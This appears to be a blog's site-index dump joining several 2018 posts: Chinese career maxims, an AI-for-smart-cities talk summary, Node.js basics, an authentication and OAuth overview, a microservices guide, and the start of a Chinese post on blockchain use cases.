评判产品好坏的唯一标准就是产品用户数量的多少。如果一个公司的产品没有用户，那么就不能称之为真正的公司。 创业公司能否发展顺利首先要看公司产品的销售量。 如果你能实现最初计划实现目标的50%，你就已经很成功了。 大部分人常用的的服务只有5-7种，你要抓住用户的兴趣点，让自己提供的产品服务成为消费者最爱使用的。 让那些最合适的人参与公司的项目，不要考虑距离的远近。 和那些你想和他们在一起的人一块工作，你没必要和你讨厌的人一块工作。 和你信任的人一块工作，因为他们会一直支持你，会像你一样来关心公司的发展。 如果条件允许，尽可能地在家里工作，因为家里环境舒适并且能节约资金。 办公室里的办公桌要这样布置：公司联合创始人坐在办公桌旁能看到对方。如果你讨厌看到对方就说明你正在和错误的人一块工作。 公司内部要有一个像Yammer一样的内部交流平台。 要很快找到自己最擅长什么，并多花点时间在这方面。 保证你周围的人都弥补你某方面的不足，并让他们做他们擅长的事，你不要参与，同时要向他们学习。 和那些能与你持不同意见并敢于与你辩论的人一块工作，这有利于公司的发展。 和那些像你一样对解决某个问题有很大热情的人一块工作，因为你们有一样的动力和远见。 多鼓励周围的人，因为每个人都需要这种鼓励。 要忠诚。 要知道，你永远不会如自己想象的那么完美，要善于聆听别人的观点。 每周至少运动4次，强健的体魄是健全的心智的前提。 在选择投资者前，你必须知道你到底想和谁一块合作共事，而不要依据估值来选择投资者。 在公司创立之初，要尽量少地融资，这样你才能学会如何花好每一分钱。花每一分钱时都将它视为公司的最后一分钱。 你必须知道你究竟想创立一家什么样的公司。 要将自己的商业目标与投资者的利益结合起来。 不要过多地开公司会议，很多时候那都是在浪费时间。 要经常面带微笑，保持愉快的心情。 要尽量多穿自己公司的T恤，对公司的品牌感到自豪。 决不能说谎。 可以犯错，但必须从中吸取教训。 决不放弃。 持续学习 即使在一个组织里一路升入决策层也不是就可以高枕无忧了，如果自己不能不断进取，公司也不能不断进步，市场自然会淘汰你，或者淘汰你的公司。\n做任何工作都有危机感的。终身学习，把变化视为唯一的不变\n打好基础 学习更多数学知识，比如逻辑学、离散数学、微积分、概率论、统计学、抽象代数、数论、范畴论、偏序理论 整理，备份你的数据 学习更多理论知识，比如形式语言，自动机与可计算性理论，计算复杂性理论，形式化方法，语义学，算法与数据结构 接触艺术和人文，比如工业设计，哲学，摄影，绘画，素描，音乐及音乐理论，电影，文学，社会科学和经济学等 向新的软件学习 提高竞争力 选对行业很重要，随时保持行业的敏感性。 要努力成为有不可替代的人，提升自己的不可替代性。 职场上保持竞争力的人共同点都是愿景清晰。 成功者都是行动派，对事物保持好奇。 社交媒体时代要时刻注意打照自己个人品牌，经营自己的人脉。 更重要的是我们必须把自己活成U盘，即用即插，可以依托但不依附于哪个公司哪个组织，拓展到不开公司却做自己的老板，每份工作都把自己当老板。 培养情商 不要去欺骗别人，因为你能骗到的人，都是相信你的人。\n把看不顺的人看顺\n把看不起的人看起\n把不想做的事做好\n把想不通的事想通\n把快骂出的话收回\n把咽不下气的咽下\n把想放纵的心收住\n你能尊重多少人，就有多少人尊重你；\n你能信任多少人，就有多少人信任你；\n你能跟多少人协作，就有多少人跟你协作；\n你能让多少人成功，就有多少人帮助你成功。\n职场人如何做到优秀 敢于表达自己的看法； 直接提出要求； 主动积级赢得注意力； 敢于接受挑战； 不私下抱怨； 配合团队作业； 敢于承担责任； 善于分享与包容； 客观接受批评； 营造氛围助上司解困； 向上司交解决问题的方案，而不是问题本身。 关于管理 跟定一位智慧领导，解决路线问题； 培养一批能干下属，解决业绩问题； 选择一群铁哥兄弟，解决人脉问题； 教育一个懂事的家属，解决后院问题； 寻找一位知己，解决情感问题。 【红顶商人胡雪岩的生意经】1.做生意如带兵,要看人行事,随机应变. 从变化中找出机会,才是一等一本事 2.办大事最要紧是拿主意!主意一拿定,说个道理并不难 3.能因时因地制宜,不拘一格,是用人的诀窍 4.不招人妒是庸才 5.“赚小钱靠术，赚大钱靠势”。 6.一个人值不值钱,看他说的话算不算数!\n【容易成功的十种能力】1.解决问题时的逆向思维能力； 2.考虑问题的换位思考能力； 3.强于他人的总结能力； 4.简洁的文书编写能力； 5.信息资料收集能力； 6.解决问题的方案制定能力； 7.超强的自我安慰能力； 8.岗位变化的承受能力； 9.勇于接受份外之事； 10.积极寻求培训和实践机会。\n【如何领导聪明人】1）聪明人知道自己的价值，并希望你也知道。多花时间去理解+认可每个人的卓越之处， 2）聪明人不喜欢被领导，多放权，让员工自己决定怎么做， 3）领导的责任是：指定方向，协调合作，维护公司文化，招聘优秀人员， 4）总结：你想怎么被管理，就怎么去管理。\n【领导者如何鼓舞团队士气？】1.保持镇定，不被失败打倒 2.着眼行动，发现自己的公司或者是团队存在失误，一定及时解决 3.公司内部透明化，遇到问题时，过多地去掩饰并声称保护公司是严重错误的。 4.通过休闲娱乐的活动，谈未来谈希望 5.公司处于低谷时，可以通过一次特别明确的小成功鼓舞士气。\n友善地对待你讨厌的人，正是你成熟的表现\n【松下幸之助：管理者在决策上要少说不】“我每天批准的他人的决定，实际上只有40%的决策是我真正认同的。你不能对任何事都说不，对于那些你认为还算是过得去的计划，大可在实行过程中指导他们。我想一个领导者有时应该接受他不太喜欢的事，因为任何人都不喜欢被否定。”\n如果你是一名普通员工，那么你只需要具备单一职业能力便可。如果你是一名创业者，那么，你必须是一个全才。\n伟大是管理自己，不是领导别人。（冯仑语《野蛮生长》）\n设置deadline 工作中学习中的deadline除了外界施加的，个人也应当对自己提出要求，并且把这个deadline作为一个强制性的标准，必须按时完成，取信于人很重要，取信于自己也很重要，这能让你尊重自己的计划和安排。\n针对于爱八卦者：应该第一时间反应出不置可否的态度，用反问他如何知道此类事情，或者说不清楚来回应。 切忌把鄙视之情写在脸上\n研究企业文化。每个工作场合都有一套不成文的规矩，刚进入某个公司时，你需要留意办公室的着装底线何在，哪些是最合适的穿着。尽量让你的衣服和高层管理人员保持一致。在置办衣服时采取保守策略，模仿经理的着装风格是最安全的。\nIf you must say yes, say it with an open heart. If you must say no, say it without fear. 必须说“可以”的时候，真心诚意地说出来；必须说“不行”的时候，毫不畏惧地说出来。\n","link":"http://localhost:1313/post/2018/career_advice/","section":"post","tags":["career"],"title":"职场菜根谭"},{"body":"AI for Smart Cities Published: Dec 07, 2018 Tags: ai, smartcity Category: ComputerScience\nI had the honer to give an 'AI for Smart Cities' presentation in 'Big Data \u0026amp; AI Asia' conference Dec 5. The conference was hold in Suntec and it was a big event around hundreds people participated.\nI managed to convey the following messages in my talk:\nWhat is smart city Why AI is relevant What DNVGL has done and what we can offer to the market. This is a picture of my presentation. And in this blog, I will briefly introduce the relevant content.\nTable of Contents Why Cities need to be smart? According to statistics, urbanization is increasing world-wide and it also bring challenges:\nBy 2050 cities will accommodate about 66% percent of the world's population In 2012 cities occupied only about 3% of the global land area In 2012 cities consumed about 75% of natural resources In 2012 cities produced 60%-80% of all greenhouse gas (GHG) emissions In order to address the above challenges, new and efficient ways have to be found for city operation. According to investigation from Cisco, there are improvements potential on many city operation aspects.\nIn order to be more efficient to operate city, we need to rely on digital way to have better insight of infrastructure status, automate operation to replace repetitive human work, take better action based on historical data, optimize infrastructure efficiency, etc.\nThe crucial parts of the digital way are to get the data, manage the data, bring value from the data, and take action accordingly. We call this new way of operating city as 'Smart city', which is mainly a data business.\nData from cities The Smart city business all starts from data. In order to find a better way to operate city, first you need to understand how the city is operating.\nEveryone in the cities is generating new data every day, e.g. shopping records, register personal data online, medical data etc. It is huge amount of data set from human being.\nWith the boost of IoT technology, we predict even more data will come from sensors than human being. We see cheaper sensors, faster network, better toolset will be the trend, and much more data will be collected in an automatic manner.\nYes, it is big data problem! In order to process the big data, we need high automation level and new ways of processing. AI technology needs to be adopted.\nEven though AI is mainly about data analytics part, without proper data acquisition, data management, data visualization, it will be difficult to succeed.\nWhy AI is relevant? The first question maybe deserve answering is what is AI.\nAccording to definition on wikipedia, AI means: Any device that perceives its environment and takes actions that maximize its chance of successfully achieving its goals.\nTo put it simple, it is to get the data, do analytics then facilitate better decision making. Still it is data business, it is all about data.\nThere are different ways to categorize AI technology:\nClassical rule based AI, Machine Learning, Deep learning Supervised and unsupervised learning depends on whether the data is labled or not Regression or classification depends on whether the label is continuous or not In-house algorithm or cloud SaaS services I am pretty sure there are other ways to categorize AI, and I do not want to be too technical in this blog and will talk about more in later blogs. One thing worth mentioning is all the above AI technical choices are relevant to Smart city context which depends on detailed scenario.\nDNVGL's Smart city footprint DNVGL recently setup a digital hub in Singapore aimed at digitising for our traditional industry sectors like oil and gas, maritime and energy. At the meantime, we are also trying to 'penetrate' into the smart city market.\nYou can have a check of following news: https://sg.channelasia.tech/article/646408/solution-provider-dnv-gl-launches-digital-hub-singapore/\nOn the competence wise, the digital hub has mixed competence:\nData analytics Software development IoT and domain knowledge in various industry sectors Smart city is a big concept, digital hub Singapore mainly focus on the following areas:\nInfrastructure performance Climate change Cyber security I will introduce you what we have done and our offerings in the following parts.\nInfrastructure performance We see aging infrastructures in the cities. In order to address the pressure from urbanization, there is need to extend the life cycle of infrastructure.\nEnergy consumption is also a big challenge for cities with increasing population, how to reduce the energy consumption is a big topic.\nTo maintenance the infrastructure also requires a lot of effort, we need to find a way to reduce the operational cost.\nAnd how to improve the efficiency of infrastructures like electric grid, ports, transportation systems will be important for big cities.\nDigital hub Singapore completes a smart lift project, I will introduce the high level concept in the following part.\nSmart Lift There are 61,000 lifts in Singapore. The total number of lifts is projected to double to 121,100 in the next 10 years.\nThese days, the lift maintenance work is mainly done by human being. Imaging if you want to understand the status of the lifts, you have to invite lift technician to the site, open the lifts, then do the measurement. It is also required that the lifts need to be checked regularly. It is expensive to do the check and some times, lift break down in-between the regular checks, and measurement results are inaccurate sometimes.\nThe smart lift project is to address the above challenge. The main purpose of smart lift project is to do predictive maintenance by utlizing IoT and anomaly detection technology.\nWe installed laser, vibration, current, temperature, humidity sensors on lift car top and lift motor room. The raw data will be pre-processed in the gateway, then send to server for further processing. The main metrics we are measuring is peak speed during trip, levelling issues, door operation, car vibration, etc.\nThe methodology of anomaly detection, which belongs to unsupervised learning. To put it simple, it figures out the normal pattern from operation data first. Then use the pattern to detect anomaly in the future.\nOnce anomaly is detected, then further analysis will start to see whether to send alert to users or not.\nBesides that, we also provide trending chart to see whether the operational data e.g. levelling is on the right direction or not.\nIn fact, we believes the methodology we use in smart lift project applies for all kinds of smart city projects and data driven projects.\nWe see big potential to consolidate the framework and make future development much more efficient.\nDigital Twin DNVGL has adopted digital twin concept in existing industries, e.g. Maritime. We will introduce the digital twin for the smart lift too.\nDigital twin refers to a digital replica of physical assets. The digital representation provides both the elements and the dynamics of how an Internet of things device operates and lives throughout its life cycle.\nFor the smart lift, the digital twin means the data sychornization between physical space and digital space. We introduce 3d viewer and dashboard to make it much easier for the users to do monitoring the system and trouble shooting.\nEdge Computing We see edge computing is playing important role in smart lift project. Edge computing can address the following issues:\nReduce operational cost by reducing the data transferred Take actions for urgent issues by avoiding back-and-forth communication Do data processing for offline scenario Address some scenario requires high data sampling resolution If we take a look of the amount of data generated from lift:\n+-----------------------+-----------------------------------+-----------------------------------+ | Number of lifts | Time period | Data size | +-----------------------+-----------------------------------+-----------------------------------+ | 1 | 0.1 second | 360 bytes | +-----------------------+-----------------------------------+-----------------------------------+ | 1 | 1 day | 311 MB | +-----------------------+-----------------------------------+-----------------------------------+ | 10 | 1 day | 3 GB | +-----------------------+-----------------------------------+-----------------------------------+ | 100 | 1 day | 30 GB | +-----------------------+-----------------------------------+-----------------------------------+ | 100 | 1 month | 1 TB | +-----------------------+-----------------------------------+-----------------------------------+ | 60, 000 | 1 month | 600 TB | +-----------------------+-----------------------------------+-----------------------------------+\nAs you can see the big amount of data will cause pressure on the computational power and also increase the operational cost. And we also find out in order to detect anomaly in some scenario, we need 10 times higher sampling resolution than the normal ones. If we increase the communication sampling resolution, it will cause data loss and also increase cost a lot.\nEdge computing can definitely help a lot.\nFor climate change and information security, which are big topics too. I will write another blog to introduce them.\nWritten by Binwei@Singapore\n","link":"http://localhost:1313/post/2018/ai_for_smartcities/","section":"post","tags":["ai","smartcity"],"title":"AI for Smart Cities"},{"body":"","link":"http://localhost:1313/tags/backend/","section":"tags","tags":null,"title":"Backend"},{"body":"Node.js Basics Published: Aug 11, 2018 Tags: web, backend Category: ComputerScience\nRecently, I used Node.js quite a lot to handle personal projects. It is easy to start, and also easy to get wrong. This blog covers the basics part of Node.js development.\nTable of Contents Module Require Every module in node is singleton.\nUse require to use module, the following is the search sequence of require method:\nFirst find js file Then json file Then node file If the module name is index.js, then it is okay just write directory name in the require parameter.\nrequire() can inject objects for dependency injection.\nModule exports From the modele itself, use exports keyword to make properties and methods available outside of the module file.\n1\texports.myDateTime = function () { 2\treturn Date(); 3\t}; Http module http module can be used to write header or content. See following example:\n1var http = require(\u0026#39;http\u0026#39;); 2http.createServer(function (req, res) { 3 res.writeHead(200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39;}); 4 res.write(\u0026#39;Hello World!\u0026#39;); 5res.write(req.url); // read query string 6 res.end(); 7}).listen(8080); File module File module can be used for file system operation.\n1require(fs) 2var http = require(\u0026#39;http\u0026#39;); 3var fs = require(\u0026#39;fs\u0026#39;); 4http.createServer(function (req, res) { 5 fs.readFile(\u0026#39;demofile1.html\u0026#39;, function(err, data) { 6 res.writeHead(200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39;}); 7 res.write(data); 8 res.end(); 9 }); 10}).listen(8080); Other useful methods in file module.\nwrite file: fs.appendfile(), fs.open(), fs.writefile()\ndelete file: fs.unlink()\nrename: fs.rename()\nUrl module Url module can be used to parse various parts of url.\n1url.parse(\u0026#39;https://www.pluralsight.com/search?q=buna\u0026#39;) 2 3Url { 4protocol: \u0026#39;https:\u0026#39;, 5slashes: true, 6auth: null, 7host: \u0026#39;www.pluralsight.com\u0026#39;, 8port: null, 9hostname: \u0026#39;www.pluralsight.com\u0026#39;, 10hash: null, 11search: \u0026#39;?q=buna\u0026#39;, 12query: \u0026#39;q=buna\u0026#39;, 13pathname: \u0026#39;/search\u0026#39;, 14path: \u0026#39;/search?q=buna\u0026#39;, 15href: \u0026#39;https://www.pluralsight.com/search?q=buna\u0026#39; } example\n1http.createServer(function (req, res) { 2 res.writeHead(200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39;}); 3 var q = url.parse(req.url, true).query; 4 var txt = q.year + \u0026#34; \u0026#34; + q.month; 5 res.send(txt); 6}).listen(8080); Use the url for testing: http://localhost:8080/?year=2017\u0026amp;month=July Output is: 2017 July\nEvent model The event model of node.js is asymmetric. The core part is event loop.\nFor example, here is how Node.js handles a file request:\nSends the task to the computer's file system. Ready to handle the next request. When the file system has opened and read the file, the server returns the content to the client. The event loop looks like this:\nThe entity that handles external events and converts them into callback invocations A loop that picks events from the event queue and pushes their callbacks to the call back stack Node will process the event queue when call stack is empty There are three methods look quite similar, it will be good to understand the difference:\nsetTimeout setImmediate Process.nextTick (not relevant event loop) NPM Npm is node package manager, which is the core part of javascript ecosystem.\nCommands Npm start, npm test: will run when there is start/test script in the package.json\nNpm -h: to show the help\nNpm help: can open a browser\nNpm init: will create the package.json\nNpm list: list all installed packages\nNpm can install global package, and can also install in local repository\nNpm can specify the versions when using npm i\nNpm can specify environment, e.g. --save, --prod, --dev\nNPM can choose install from 'gist' instead of a version, also can install from folder\nnpm publish: can publish your package to npm registery\nVersion Semantic version: major.minor.patch\nPatch increase when bug fixing Minor increase when introduce new feature Major increase when breaking changes In the package.json: ^means major version can be greater, ~means minor version can be greater\nnpm version patch/minor/major to update the version info in the pcakge.json rather than manually change the version (it will also do the git commit for developers)\nOthers Difference from client javascript Javascript in node.js app, differentiate client and server code.\nFor example:\nserver can call require while client can call windows. server code modification needs to restart node to see the changes, while client code just need browser refresh. console.log in the server code will output the message to terminal app, the client code will output the message the browser console. Uglify gulp can uglify your repository\nError code If there is error, can use res.status(500).send(err) to return the error code\n1bookRouter.route(\u0026#39;/Books/:bookId\u0026#39;).get(function(req, res)) { 2 Book.findById(req.params.bookId, function(err, book) { 3 if (err) { 4 res.status(500).send(err); 5 } else { 6 res.json(book); 7 } 8 }) 9} Compare with Microsoft technologies Written by Binwei@Singapore\n","link":"http://localhost:1313/post/2018/nodejs_basics/","section":"post","tags":["backend","web"],"title":"Node.js Basics"},{"body":"","link":"http://localhost:1313/tags/web/","section":"tags","tags":null,"title":"Web"},{"body":"Authentication \u0026amp; Authorization Basic Published: Mar 14, 2018 Tags: security Category: ComputerScience\nAuthentication and Authorization are two relevant but different concepts, which causes confusion sometimes. Both of them are important for SaaS solution. This blog explains the basic of these two concepts.\nTable of Contents Single sign on In classic intranet scenarios, normally windows authentication will be used in intranet scenario. All parties belong to Active Directory which makes things easy.\nHowever, in a micro services scenario the authentication becomes a challenge.\nMethod of allowing users access to all resources they need within an environment with a single username and password Negates having to remember multiple usernames and passwords Mitigates risk by keeping users from writing down credentials Easier to manage and allows for centralized control over password changes An obvious solution to achieve SSO is to share session information, however it is impossible due to same origin policy.\nToken service Normally a centralized token service can help to achieve SSO.\nToken service encrypt token by using private key, and the client decrypt by using public key\nToken service endpoints:\nAuthorize Token Userinfo Discovery End session Introspection Revocation Other endpoints:\nAuthorization endpoint: used by the client to obtain authorization from the resource owner via user-agent redirection Token endpoint: used by the client to exchange an authorization grant for an access token, typically with client authentication Redirection endpoint: used by the authorization server to return responses containing authorization credentials to the client via the resource owner user-agent Normally OpenID Connect (OIDC) is used for Identity issue.\nToken Purpose of a security token\nSecurity tokens are (protected) data structures A client requests a token An issuer issue a token A resource consumes a token has a trust relationship with the issuer Normally, a token:\nContain information about issuer and subject (claims - property on the identity) Signed (tamper proof \u0026amp; authenticity) Typically contain an expiration time Contain header: metadata, algorithms \u0026amp; keys used Protocols SAML 1.1/2.0\nXML based many encryption \u0026amp; signature options very expensive Simple Web Token (SWT)\nForm/URL encoded symmetric signatures only JSON Web Token (JWT)\nJSON encoded symmetric and asymmetric signatures (HMACSHA256-384, ECDSA, RSA) symmetric and asymmetric encryption (RSA, AES/CGM) (the new standard) SAML is very secure and advanced, which requires XML protocol. Most mobile devices do not have this.\nSimple Web Token use symmetric algorithm, which is too simple.\nJWT is in-between, and on its way to official standardization. http://self-issued.info/docs/draft-ietf-oauth-json-web-token.html\nToken types Refresh Token:\nA token to renew the access token User doesn't have to re-authenticate Longer expiration time than access token Bearer Token \u0026amp; Reference token\nSelf-contained access token, once it is sent to the client, there is no way to revoke If the machine is stolen, then the token can be used until it is expired Reference token can fix the above issue For the details, see here: https://auth0.com/docs/tokens\nOAuth 2.0 Oauth 2.0 is about authorization. The standard doesn't say anything about the user. It means Oauth only cares about resource scope and not identity scope.\nOauth does not build on SSL transportation protocol. Oauth2 has many variation, big players have their own implementations.\nFrom web, mobile and desktop application\nDifferent types of applications require different means to achieve authorization Where can the token be delivered to Can the client application safely store secrets The main actors User (resource owner): An entity capable of granting access to a protected resource Client: An application making protected resource requests on behalf of the resource owner and with it authorization Resource server: The server hosting the protected resources Authorization server: The server issuing access tokens to the client after successfully authenticating the resource owner and obtaining authorization Client has two types:\nConfidential client: Clients capable of maintaining the confidentiality of their credentials, e.g. MVC application Public client: clients incapable of maintaining the confidentiality of their credentials, e.g. native mobile applications and javascript applications Flows OAuth 2.0 supports several different grants. By grants we mean ways of retrieving an Access Token. Deciding which one is suited for your case depends mostly on your Client's type, but other parameters weigh in as well, like the level of trust for the Client, or the experience you want your users to have.\nSee details here: https://auth0.com/docs/api-auth/which-oauth-flow-to-use\nPrinciples Transitive Trust Enabling authentication based on authenticating to a trusted third party\nUser logs into site \u0026quot;A\u0026quot; using their Google or Facebook credentials Both user and site \u0026quot;A\u0026quot; trust Google or Facebook, so site \u0026quot;A\u0026quot; accepts the authentication Security concerns come into play if the trusted site is compromised\nHacker could potentially access any sites or applications that use the third party credentials for access Understand what 3rd party trusts you allow / evaluate how security and potential risks Trusts that exist between domains or companies\nOne-way Trust: A trusts B/ B doesn't trust A Two-way Trust: A trusts B/ B trusts A Non-transitive Trust: A trusts B but doesn't allow that trust to extend Transitive Trust: A trusts B, B trusts C, so A trusts C Authorization principles In general, authroization needs to be:\nLeast privilege Separation of duties ACLs Mandatory access (pre-defined set of capabilities and access to information e.g. who can share what to who) Discretionary access (allow users to dynamically share information with others) Rule-based access control Role-based access control Resource-based access control (between gray area with business logic) Time of day restrictions Authorization is application specific, which is one of the reason do not combine authentication and authorization.\nIntroduce Authorization Provider Authorization provider need to have an Admin UI Authorization provider is to map identity to permission Written by Binwei@Oslo\n","link":"http://localhost:1313/post/2018/authentication_authorization_explainations/","section":"post","tags":["security"],"title":"Authentication \u0026 Authorization Basic"},{"body":"Microservices Introduction Published: Mar 07, 2018 Tags: architecture, cloud Category: ComputerScience\nMicroservice is a software architecture style, in which complex applications are composed of small, autonomous process communicating with each other using language-agnostic API, which is a very common cloud pattern.\nTable of Contents Microservices Design Principles High cohesion High cohesion means single focus and single responsibility. It follows SOLID principle, which means service only change for one reason.\nAutonomous Loose coupling Honor contracts and interfaces Stateless Independently changeable Independently deployable Backwards compatible Concurrent development Approach:\nCommunication by network: synchronous, asynchronous (publish/subscribe to events) Technology agnostic API Avoid client libraries Contracts between services: fixed and agreed interfaces, shared models, clear input and output Avoid chatty exchanges between services Avoid sharing between services: databases, shared libraries Microservice ownership by team: responsibility to make autonomous, agreeing contracts between teams, responsible for long-term maintenance, collaborative development (communicate contract requirements, communicate data requirements), concurrent development Versioning: avoid breaking changes, backwards compatibility, integration tests, have a versioning strategy (concurrent versions: old and new; semantic versioning: Major.Minor.Patch (e.g. 15.1.2); coexisting endpoints: /V2/customer/) Business Domain Centric Service represents business function Scope of service and identify boundaries (Bounded context from DDD) Shuffle code if required: group related code into a service, aim for high cohesion Responsive to business change Approach:\nIdentify business domains in a coarse manner, review sub groups of business functions or areas Review benefits of splitting further and fix incorrect boundaries: merge or split Agree a common language Microservices for data (CRUD) or functions Explicit interfaces for outside world Splitting using technical boundaries Resilience Embrace failure: start another service rather than spend energy to protect service Multiple instances: register on startup, deregister on failure Types of failure: exceptions \u0026amp; errors, delays, unavailability Validate input: service to service, client to service Approach\nDesign for known failures Failure of downstream systems: e.g. other services internal or external Degrade functionality on failure detection Default functionality on failure detection Design system to fail fast Use timeouts: use for connected systems, timeout our requests after a threshold, service to service, service to other systems, standard timeout length, adjust length on a case by case basis Monitor and log timeouts Observable System health: status, logs, errors Centralized monitoring \u0026amp; logging Distributed transactions Quick problem solving Quick deployment requires feedback Data used for capacity planning \u0026amp; scaling To understand what is actually used Monitor business data Approach:\nReal-time monitoring Monitor the host: CPU, memory, disk usage, etc. Expose metrics within the services: response times, timeouts, exceptions and errors Business data related metrics: e.g. number of orders, average time from basket to checkout Collect and aggregate monitoring data: monitoring tools that provide aggregation, monitoring tools that provide drill down options Monitoring tool that can help visualise trends, compare data across servers, trigger alerts When to log: startup or shutdown, code path milestones (requests, responses and decisions), timeouts, exceptions and errors Structured logging: level (information, error, debug, statistic), date and time, correlation id, host name, service name and service instance, message Traceable distributed transactions: correlation id passed service to service Automation Tools to reduce testing, provide quick feedback, and quick deployment\nMicroservices Development Strategy Synchronous communication Request response communication: client to service, service to service, service to external Remote procedure call: sensitive to change HTTP: work across the internet, firewall friendly REST: CRUD using HTTP verbs, natural decoupling, open communication protocol, REST with HATEOAS (Hypermedia As The Engine Of Application State) Synchronous issues: both parties have to be available, performance subject to network quality, clients must know location of service (host\\port) Asynchronous communication Event based: mitigates the need of client and service availability, decouples client and service Message queueing protocol: message Brokers, subscriber and publisher are decoupled, microsoft message queuing (MSMQ), RabbitMQ, ATOM (HTTP to propagate events) Asynchronous challenge: complicated, reliance on message broker, visibility of the transaction, managing the messaging queue Real world systems: would use both synchronous and asynchronous Hosting Platforms: Registration and Discovery The main problem to resolve: host, port and version Service registry database Register on startup Deregister service on failure Cloud platforms make it easy Local platform registration options: self registration, third-party registration Local platform discovery options: client-side discovery, server-side discovery Observable Microservices: Monitoring Tech Centralised tools: Nagios, PRTG, New Relic Desired features: metrics across servers, automatic or minimal configuration, client libraries to send metrics, test transactions support, alerting Network monitoring Standardise monitoring: central tool, preconfigured virtual machines or containers Real-time monitoring Observable Microservices: Logging Tech Portal for centralised logging data: Elastic log, Log stash, Splunk, Kibana, Graphite Client logging libraries: Serilog and many more... Desired features: structured logging, logging across servers, automatic or minimal configuration, correlation (context id) for transactions, Standardise logging: central tool, template for client library Microservices Performance: Caching Caching to reduce: client calls to services, service calls to databases, service to service calls API gateway (proxy) level Client \u0026amp; service side Considerations: simple to setup and manage, be careful about data leaks Microservices Performance: API Gateway Help with performance: load balancing, caching Help with: creating central entry point, exposing services to clients, one interface to many services, dynamic location of services, routing to specific instance of service, service registry database Security: dedicated security service, central security vs service level For Greenfield Microservices Start off with monolithic design: high level, evolving seams, develop areas into modules, boundaries start to become clearer, refine and refactor design, split further when required Modules become services Shareable code libraries promote to service Review microservice principles at each stage Prioritise by: minimal viable product, customer needs and demand Microservices Provisos Accepting initial expense: longer development times, cost and training for tools and new skills Skilling up for distributed systems: handling distributed transactions, handling reporting Additional testing resource: latency and performance testing, testing for resilience Improving infrastructure: security, performance, reliance Overhead to mange microservices Richardson Maturity Model http://martinfowler.com/articles/richardsonMaturityModel.html\nPatterns Saga A saga is a class that represents a running instance of a business process.\nDepending on the actual capabilities of the bus you use, the saga can be persisted, suspended and resumed as appropriate.\nSee more details in the following URL: https://docs.particular.net/nservicebus/sagas/\nEvent sourcing \u0026amp; CQRS Event sourcing contain all the event and changes.\nBy adding event sourcing to an application, you get a hold of raw data.\nBy combining event sourcing and CQRS you end up with raw business events stored in the command stack properly denormalized for the sake of the application core functions.\nAt any time, though, you can add an extra module that reads raw data and transforms that into other meaningful chunks of information for whatever business purpose you might have.\nWhen it comes to highlighting the benefits of event sourcing, the first point usually mentioned is this: with events you never miss a thing of what happens within the system.\nIn a create, read, update, delete (CRUD) system, you typically have one representation of data - mostly relational - and one or more simple projects that most of the time just adapter tabular data to the needs of the presentation layer.\nWith event sourcing, you take this model much further, and lowering the abstraction level of the stored data is the key factor. The more domain-accurate information you store, the richer and more numerious projections you can build at any later time.\nAn approach to persistence that concentrates on persisting all the changes to a persistent state, rather than persisting the current application state itself. Combined the usage of snapshot.\nSee details in article: https://msdn.microsoft.com/en-us/magazine/mt793267.aspx\nData Integration patterns The four most common design patterns for data integration are broadcast, aggregation, bidirectional synchronization and correlation.\nCircuit breaker pattern Circuit breaker pattern prevent repeatedly trying to execute an operation that is likely to fail The circuit breaker is a proxy that monitors the number of recent failures Prevents wasting valuable resources because of the wait Normally, the client has some retry logic Multiple tenants app Per-tenant cost Scale: number of tenants, data volume, workload Tenant isolation: security, performance, lifetime management, etc business continuity, disaster recovery customization per-tenant (for some ISVs) Other patterns Actor Model: http://www.brianstorti.com/the-actor-model/ Content Delivery Network (CDN) pattern Uploading to storage: Do not use web server to do upload, use storage service Scale up \u0026amp; scale out: Tools SignalR ASP.NET SignalR is a new library for ASP.NET developers that makes it incredibly simple to add real-time web functionality to your applications. It's the ability to have your server-side code push content to the connected clients as it happens, in real-time.\nYou may have heard of WebSockets, a new HTML5 API that enables bi-directional communication between the browser and server. SignalR will use WebSockets under the covers when it's available, and gracefully fallback to other techniques and technologies when it isn't, while your application code stays the same.\nSignalR also provides a very simple, high-level API for doing server to client RPC (call JavaScript functions in your clients' browsers from server-side .NET code) in your ASP.NET application, as well as adding useful hooks for connection management, e.g. connect/disconnect events, grouping connections, authorization.\nService bus NServiceBus: .net service bus. Keep the underlying transpose abstract MSMQ queues: Computer management -\u0026gt; Service and Applications -\u0026gt; Message Queuing -\u0026gt; Private queues RabbitMQ: supports multiple platforms, MSMQ is windows native Sql server Azure: Queues, Service bus Written by Binwei@Oslo\n","link":"http://localhost:1313/post/2018/microservices_introduction/","section":"post","tags":["architecture","cloud"],"title":"Microservices Introduction"},{"body":"Blockchain Scenario Published: Feb 26, 2018 Tags: blockchain, security Category: ComputerScience\nThis blog explain the potential scenarios of blockchain usage. The content comes from good articles on web.\nTable of Contents 分布式数字货币系统 现实生活中常用的纸币具备良好的可转移性，可以相对容易地完成价值的交割。 但是对于数字货币来说，数字化内容容易被复制，数字货币的持有人可以将同一份货币发给多个接受者，这种攻击称为“双重支付攻击”。\n中心化控制下，数字货币的实现相对容易。 但是，很多时候很难找到一个安全可靠的第三方机构来充当这个中心管控的角色。\n有一些问题是中心化数字货币难以解决的：\n发生贸易的两国可能缺乏足够的外汇储备用以支付 汇率的变化导致双方对合同有不同意见 网络上的匿名双方进行直接买卖而不通过电子商务平台 交易的两个机构彼此互不信任，找不到双方都认可的第三方担保 使用第三方担保系统，但某些时候可能无法连接 第三方的系统可能会出现故障或受到篡改攻击 去中心化（de-centralized）或多中心化(multi-centralized)的数字货币系统可以有效解决以上问题。\n然而在“去中心化”的场景下，实现数字货币存在如下几个难题：\n货币的防伪：谁来负责对货币的真伪进行鉴定 货币的交易：如何确保货币从一方安全转移到另外一方 避免双重支付：如何避免同一份货币支付给多个接受者 这就是区块链需要解决的问题。\n区块链现状 跟传统的记账技术相比，基于区块链的分布式账本应该包括如下特点：\n维护一条不断增长的链，只可能添加记录，而发生过的记录都不可篡改 去中心化，或者说多中心化，无需集中控制而能达成共识，实现上尽量采用分布式 通过密码学的机制来确保交易无法被抵赖和破坏，并尽量保护用户信息和记录的隐私性 公开链，联盟链，私有链 根据参与者的不同，可以分为公开（public）链、联盟（consortium）链和私有（private）链\n共有链：任何人都可以参与使用和维护，如比特币区块链，信息是完全公开的 私有链：由集中管理者进行管理限制，只有内部少数人可以使用，信息不公开 联盟链：介于两者之间，由若干组织一起合作维护一条区块链，该区块链的使用必须是带有权限访问，相关信息会得到保护，如供应链机构或银行联盟 